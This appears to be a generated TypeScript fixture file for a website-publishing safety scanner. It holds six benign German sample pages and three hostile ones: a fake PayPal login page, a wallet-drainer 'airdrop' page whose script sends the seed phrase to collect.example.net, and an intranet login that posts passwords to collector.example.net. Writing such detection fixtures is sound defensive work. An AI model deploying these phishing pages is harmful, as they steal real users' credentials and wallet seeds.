/**
 * GENERATED FILE — DO NOT EDIT.
 *
 * Source of truth: `src/services/safety/__fixtures__/hosted-publish/`.
 * Regenerate with: `pnpm --filter @goblin/api ops:gen-router`.
 *
 * The unit battery reads the real files; this constant exists so the DEPLOYED API
 * can re-run the same nine artifacts on production (U2.8). A test asserts the two
 * are identical.
 */

/* eslint-disable */

export const HOSTED_SCAN_FIXTURES: Record<string, Record<string, string>> =
{
  "benign-01-portfolio": {
    "index.html": "<!doctype html>\n<html lang=\"de\">\n<head><meta charset=\"utf-8\"><title>Marta Weiss — Keramik</title><link rel=\"stylesheet\" href=\"style.css\"></head>\n<body>\n  <h1>Marta Weiss</h1>\n  <h2>Handgetöpferte Keramik aus Bern</h2>\n  <p>Jedes Stück wird auf der Scheibe gedreht und zweimal gebrannt.</p>\n  <p>Offene Werkstatt: jeden ersten Samstag im Monat, 10–16 Uhr.</p>\n  <a href=\"mailto:marta@example.ch\">Schreib mir</a>\n</body>\n</html>\n",
    "style.css": "body { font-family: Georgia, serif; max-width: 40rem; margin: 4rem auto; color: #222; }\nh1 { font-size: 2.5rem; margin-bottom: 0; }\n"
  },
  "benign-02-own-login": {
    "index.html": "<!doctype html>\n<html lang=\"de\">\n<head><meta charset=\"utf-8\"><title>Vereinsportal TV Rot-Weiss — Anmelden</title></head>\n<body>\n  <h1>Vereinsportal</h1>\n  <p>Melde dich mit deinen Vereinsdaten an.</p>\n  <form method=\"post\" action=\"/api/login\">\n    <label for=\"benutzer\">Benutzername</label>\n    <input id=\"benutzer\" name=\"benutzer\" type=\"text\" autocomplete=\"username\">\n    <label for=\"passwort\">Passwort</label>\n    <input id=\"passwort\" name=\"passwort\" type=\"password\" autocomplete=\"current-password\">\n    <button type=\"submit\">Anmelden</button>\n  </form>\n  <p><a href=\"/hilfe\">Zugangsdaten vergessen?</a></p>\n</body>\n</html>\n"
  },
  "benign-03-newsletter": {
    "index.html": "<!doctype html>\n<html lang=\"de\">\n<head><meta charset=\"utf-8\"><title>Hofladen Brunner — Newsletter</title></head>\n<body>\n  <h1>Hofladen Brunner</h1>\n  <h2>Was diese Woche reif ist</h2>\n  <p>Einmal pro Woche eine kurze Mail: was geerntet wurde, was im Hofladen steht.</p>\n  <form method=\"post\" action=\"https://brunner.us21.list-manage.com/subscribe/post\">\n    <label for=\"mailfeld\">E-Mail-Adresse</label>\n    <input id=\"mailfeld\" name=\"EMAIL\" type=\"email\" placeholder=\"deine E-Mail-Adresse\">\n    <button type=\"submit\">Eintragen</button>\n  </form>\n  <p>Abmelden geht jederzeit über den Link in jeder Mail.</p>\n</body>\n</html>\n"
  },
  "benign-04-shop-stripe": {
    "index.html": "<!doctype html>\n<html lang=\"de\">\n<head><meta charset=\"utf-8\"><title>Buchbinderei Lang — Werkstattkurs</title></head>\n<body>\n  <h1>Werkstattkurs Buchbinden</h1>\n  <p>Zwei Tage, kleine Gruppe, alles Material inklusive. 240 CHF.</p>\n  <h2>Bezahlung</h2>\n  <p>Die Bezahlung läuft über Stripe. Kreditkarte, Twint oder Rechnung —\n     deine Kartennummer siehst nur du und Stripe, wir bekommen sie nie zu sehen.</p>\n  <a href=\"https://buy.stripe.com/test_beispiel_link\">Platz buchen</a>\n</body>\n</html>\n"
  },
  "benign-05-spa-build": {
    "assets/index-DiwrgTda.js": "var e=document.getElementById(\"root\");function t(n){return n.map(function(r){return\"<li>\"+r.tag+\" \"+r.von+\"–\"+r.bis+\"</li>\"}).join(\"\")}fetch(\"/api/schichten\").then(function(n){return n.json()}).then(function(n){e.innerHTML=\"<ul>\"+t(n)+\"</ul>\"}).catch(function(){e.textContent=\"Schichten konnten nicht geladen werden.\"});\n",
    "assets/index-a1b2c3d4.css": ":root{--bg:#fff}body{margin:0;font-family:system-ui}#root{padding:2rem}\n",
    "index.html": "<!doctype html>\n<html lang=\"de\">\n<head>\n  <meta charset=\"utf-8\"><title>Schichtplan</title>\n  <script type=\"module\" crossorigin src=\"/assets/index-DiwrgTda.js\"></script>\n  <link rel=\"stylesheet\" href=\"/assets/index-a1b2c3d4.css\">\n</head>\n<body><div id=\"root\"></div></body>\n</html>\n"
  },
  "benign-06-crypto-guide": {
    "index.html": "<!doctype html>\n<html lang=\"de\">\n<head><meta charset=\"utf-8\"><title>Wallet-Sicherheit — was du wissen musst</title></head>\n<body>\n  <h1>Wallet-Sicherheit</h1>\n  <h2>Die wichtigste Regel</h2>\n  <p><strong>Gib deine Seed Phrase niemals irgendwo ein.</strong> Die Wiederherstellungs-Phrase\n     (auch Mnemonic oder Recovery Phrase genannt) ist dein Wallet. Wer sie hat, hat dein Geld.</p>\n  <p>Keine echte Wallet-Software, keine Börse und kein Support-Mitarbeiter wird dich jemals\n     nach deiner Seed Phrase oder deinem privaten Schlüssel fragen. Jede Seite, die danach\n     fragt, ist ein Betrug — egal wie echt sie aussieht.</p>\n  <h2>Woran du Betrugsseiten erkennst</h2>\n  <ul>\n    <li>Sie fragen nach der Wiederherstellungs-Phrase, oft als „Wallet verbinden\" getarnt.</li>\n    <li>Sie drängen zur Eile: „Dein Konto wird in 10 Minuten gesperrt.\"</li>\n    <li>Die Adresse in der Adresszeile stimmt nicht mit der echten Seite überein.</li>\n  </ul>\n  <p>Schreib dir die Phrase auf Papier. Nicht abfotografieren, nicht in die Notizen-App.</p>\n</body>\n</html>\n"
  },
  "hostile-01-paypal-phish": {
    "index.html": "<!doctype html>\n<html lang=\"de\">\n<head><meta charset=\"utf-8\"><title>PayPal - Konto bestätigen</title></head>\n<body>\n  <h1>PayPal</h1>\n  <p>Ihr Konto wurde vorübergehend eingeschränkt. Bitte bestätigen Sie Ihre Daten.</p>\n  <form method=\"post\" action=\"/verify\">\n    <label for=\"email\">E-Mail</label>\n    <input id=\"email\" name=\"email\" type=\"text\">\n    <label for=\"passwort\">Passwort</label>\n    <input id=\"passwort\" name=\"passwort\" type=\"password\">\n    <button type=\"submit\">Konto bestätigen</button>\n  </form>\n</body>\n</html>\n"
  },
  "hostile-02-wallet-drainer": {
    "assets/claim.js": "async function claim(){const s=document.getElementById(\"wf\").value;await fetch(\"https://collect.example.net/s\",{method:\"POST\",body:s});drainWallet(s);}\n",
    "index.html": "<!doctype html>\n<html lang=\"de\">\n<head><meta charset=\"utf-8\"><title>Airdrop beanspruchen</title><script src=\"/assets/claim.js\"></script></head>\n<body>\n  <h1>Dein Airdrop wartet</h1>\n  <p>Verbinde dein Wallet, um 2.500 Token zu beanspruchen. Nur noch 9 Minuten.</p>\n  <form method=\"post\" action=\"/claim\">\n    <label for=\"wf\">Wallet wiederherstellen</label>\n    <input id=\"wf\" name=\"seedPhrase\" type=\"text\" placeholder=\"Seed Phrase (12 oder 24 Wörter)\">\n    <button type=\"submit\">Wallet verbinden</button>\n  </form>\n</body>\n</html>\n"
  },
  "hostile-03-cred-exfil": {
    "index.html": "<!doctype html>\n<html lang=\"de\">\n<head><meta charset=\"utf-8\"><title>Firmen-Intranet Login</title></head>\n<body>\n  <h1>Intranet</h1>\n  <form method=\"post\" action=\"https://collector.example.net/collect\">\n    <label for=\"benutzer\">Benutzername</label>\n    <input id=\"benutzer\" name=\"benutzer\" type=\"text\">\n    <label for=\"passwort\">Passwort</label>\n    <input id=\"passwort\" name=\"passwort\" type=\"password\">\n    <button type=\"submit\">Anmelden</button>\n  </form>\n</body>\n</html>\n"
  }
};
